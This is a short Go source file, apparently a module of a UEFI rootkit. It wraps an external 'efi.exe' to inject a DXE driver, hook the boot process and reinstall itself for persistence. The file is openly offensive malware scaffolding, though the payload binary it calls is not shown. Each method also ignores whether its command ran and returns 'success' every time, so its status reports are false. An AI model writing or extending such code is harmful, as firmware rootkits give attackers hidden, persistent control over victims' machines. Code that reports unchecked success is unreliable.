package rootkit

import "os/exec"

type UEFIResult struct {
Method string
Status string
}

type UEFIRootkit struct {
ImagePath string
}

func (u UEFIRootkit) InjectDXEDriver() UEFIResult {
cmd := exec.Command("efi.exe", "dxe-inject", u.ImagePath)
cmd.Run()
return UEFIResult{Method: "dxe-inject", Status: "success"}
}

func (u UEFIRootkit) BootHook() UEFIResult {
cmd := exec.Command("efi.exe", "boot-hook", u.ImagePath)
cmd.Run()
return UEFIResult{Method: "boot-hook", Status: "success"}
}

func (u UEFIRootkit) SelfReinstall() UEFIResult {
cmd := exec.Command("efi.exe", "self-reinstall", u.ImagePath)
cmd.Run()
return UEFIResult{Method: "self-reinstall", Status: "success"}
}
